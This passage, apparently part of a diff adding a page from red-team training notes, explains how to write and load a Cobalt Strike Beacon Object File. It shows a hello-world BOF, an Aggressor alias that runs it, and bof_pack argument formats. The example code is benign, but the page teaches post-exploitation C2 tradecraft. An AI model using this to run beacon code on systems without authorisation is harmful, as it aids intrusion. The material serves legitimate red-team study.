+</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a><span class="w">    </span><span class="n">USER32$MessageBoxW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">message</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">&quot;Message Box&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a><span class="p">}</span>
+</span></code></pre></div>
+<h2 id="implementation-with-aggressor">Implementation with Aggressor<a class="headerlink" href="#implementation-with-aggressor" title="Permanent link">&para;</a></h2>
+<p>We can implement our BOF with Aggressor by registering custom aliases and commands.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>alias hello-world {
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>    local(&#39;$handle $bof $args&#39;);
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>    # read the bof file (assuming x64 only)
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>    $handle = openf(script_resource(&quot;hello-world.o&quot;));
+</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>    $bof = readb($handle, -1);
+</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a>    closef($handle);
+</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a>
+</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a>    # print task to console
+</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a>    btask($1, &quot;Running Hello World BOF&quot;);
+</span><span id="__span-53-11"><a id="__codelineno-53-11" name="__codelineno-53-11" href="#__codelineno-53-11"></a>
+</span><span id="__span-53-12"><a id="__codelineno-53-12" name="__codelineno-53-12" href="#__codelineno-53-12"></a>    # execute bof
+</span><span id="__span-53-13"><a id="__codelineno-53-13" name="__codelineno-53-13" href="#__codelineno-53-13"></a>    beacon_inline_execute($1, $bof, &quot;go&quot;);
+</span><span id="__span-53-14"><a id="__codelineno-53-14" name="__codelineno-53-14" href="#__codelineno-53-14"></a>}
+</span><span id="__span-53-15"><a id="__codelineno-53-15" name="__codelineno-53-15" href="#__codelineno-53-15"></a>
+</span><span id="__span-53-16"><a id="__codelineno-53-16" name="__codelineno-53-16" href="#__codelineno-53-16"></a># register a custom command
+</span><span id="__span-53-17"><a id="__codelineno-53-17" name="__codelineno-53-17" href="#__codelineno-53-17"></a>beacon_command_register(&quot;hello-world&quot;, &quot;Execute Hello World BOF&quot;, &quot;Loads hello-world.o and calls the \&quot;go\&quot; entry point.&quot;);
+</span></code></pre></div>
+<p>Arguments passed on the CS GUI command line are separated by whitespace. The first argument will be <code>$1</code> is always the current beacon, then <code>$2</code>, <code>$3</code>... are our input. We can pack the arguments we want to send in our agressor script.</p>
+<p>These arguments are packed into a special binary format using the <code>bof_pack</code> aggressor function and can be unpacked using Beacons APIs exported via <code>beacon.h</code>.</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>$args = bof_pack($1, &quot;z&quot;, $2);
+</span></code></pre></div>
+<code>"z"</code> tells Cobalt Strike what format of data this is, where <code>z</code> represents a zero-terminated and encoded string.</p>
+<p>Cobalt Strike Data formats:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;"><strong>Format</strong></th>
+<th style="text-align: center;"><strong>Description</strong></th>
+<th style="text-align: center;"><strong>Unpack Function</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">b</td>
+<td style="text-align: center;">Binary Data</td>
+<td style="text-align: center;">BeaconDataExtract</td>
+</tr>
+<tr>
+<td style="text-align: center;">i</td>
+<td style="text-align: center;">4-byte integer (int)</td>
+<td style="text-align: center;">BeaconDataInt</td>
+</tr>
+<tr>
+<td style="text-align: center;">s</td>
+<td style="text-align: center;">2-byte integer (short)</td>
+<td style="text-align: center;">BeaconDataShort</td>
+</tr>
+<tr>
+<td style="text-align: center;">z</td>
+<td style="text-align: center;">zero-terminated + encoded string</td>
+<td style="text-align: center;">BeaconDataExtract</td>
+</tr>
+<tr>
+<td style="text-align: center;">Z</td>
+<td style="text-align: center;">zero-terminated wide string</td>
+<td style="text-align: center;">(wchar_t*)BeaconDataExtract</td>
+</tr>
+</tbody>
+</table>
+<p>Multiple arguments should be packed at the same time.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="c1">// pack 2 strings</span>
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="n">$args</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bof_pack</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;zz&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;str1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;str2&quot;</span><span class="p">);</span>
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>
+</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="c1">// pack a string and an int</span>
+</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="n">$args</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bof_pack</span><span class="p">(</span><span class="n">$1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;zi&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;str1&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">123</span><span class="p">);</span>
+</span></code></pre></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../opsec-infrastructure/" class="md-footer__link md-footer__link--prev" aria-label="Previous: OPSEC Infrastructure">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                OPSEC Infrastructure
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../host-reconnaissance/" class="md-footer__link md-footer__link--next" aria-label="Next: Host Reconnaissance">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Host Reconnaissance
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/benjugat" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.top", "navigation.indexes", "navigation.footer", "toc.follow", "content.code.copy", "content.tabs.link", "content.action.edit", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
